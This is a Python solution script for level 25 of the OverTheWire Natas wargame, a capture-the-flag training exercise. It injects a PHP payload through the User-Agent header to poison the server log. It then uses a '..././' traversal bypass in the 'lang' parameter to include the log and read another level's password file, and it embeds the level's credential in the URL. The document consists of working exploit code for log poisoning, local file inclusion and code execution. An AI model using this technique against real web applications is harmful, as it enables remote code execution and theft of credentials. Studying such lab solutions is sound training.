import requests

url = "http://natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c@natas25.natas.labs.overthewire.org"

php_payload = "<?php echo file_get_contents('/etc/natas_webpass/natas26'); ?>"
	
s = requests.Session()
r = s.get(url)
session_id = list(r.cookies.get_dict().values())[0]
r = s.get(url, headers={"User-Agent":php_payload}, params={"lang": f"..././logs/natas25_{session_id}.log"})
password = r.text.split('\n "Directory')[0].split(']')[1].strip()

print(f"Natas26 password : {password}")
